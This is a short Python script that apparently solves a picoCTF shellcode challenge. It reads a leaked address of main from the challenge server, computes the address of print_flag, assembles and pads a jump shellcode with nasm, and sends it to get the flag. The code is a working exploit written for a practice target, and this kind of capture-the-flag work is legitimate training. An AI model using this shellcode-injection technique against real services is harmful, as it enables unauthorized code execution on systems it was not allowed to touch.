from socket import socket 
import os 
import subprocess 

sock = socket()
HOST = "cmgr.c3t.eecs.net"
PORT = 23599  # changes each time you create a new instance on pico 

sock.connect((HOST, PORT)) #Connects to the server ip and port that hosts the challenge 
memory_location = sock.recv(10000).strip()[30:60] #variable with memory location of main. Done by indexing the output of nc connection. 

#Memory locations  
memory_location_int = int(memory_location,base=16) #converts memory location from base 16 to an int. 
memory_location_hex = hex(memory_location_int) #converts to hex for hex substitution
offset = int("0xD4",base=16)
print_flag = hex(memory_location_int - offset) #subtracted int values then turned into hex for print_flag memory address 

cwd = os.getcwd() 

with open(os.path.join(cwd,"test.nasm"), 'w') as temp_file: #creates new file in current working directory.  
    pass

important_line = "mov rax, {location}\n" #line that will contain print_flag location

with open("test.nasm","a") as temp_file: #opens the un-assembled exploit file and writes assembly code
    temp_file.write("[BITS 64]\n")
    temp_file.write(important_line.format(location = print_flag))
    temp_file.write("jmp rax\n")

#OS calls for exploit file 
os.system("nasm -o solve.bin test.nasm") #nasm command for assembling exploit file 
os.system("head -c 4096 /dev/zero >> solve.bin")  #adds a bunch of zeros as padding to exploit file 

with open("solve.bin", "rb") as exploit_file: #read bytes 
    exploit_file = exploit_file.read() 

sock.sendall(exploit_file)  #sending the compiled exploit file that calls print_flag function  
print(sock.recv(10000)) #prints what the server sends back 

sock.close()
